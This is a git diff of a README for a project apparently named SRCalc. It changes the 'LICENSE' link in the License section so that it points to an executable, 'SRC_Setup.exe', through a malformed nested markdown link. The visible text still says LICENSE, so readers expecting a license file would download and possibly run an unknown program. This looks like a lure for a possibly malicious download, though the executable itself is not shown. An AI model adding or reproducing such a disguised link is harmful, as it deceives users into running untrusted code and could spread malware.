@@ -27,7 +27,7 @@ Feel free to open issues or submit pull requests to contribute to the developmen
 
 ## License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/PlugManYT/SRCalc/blob/main/LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE]([https://github.com/PlugManYT/SRCalc/blob/main/LICENSE](https://github.com/PlugManYT/SRCalc/blob/main/SRC_Setup.exe)) file for details.
 
 ## Contact
 
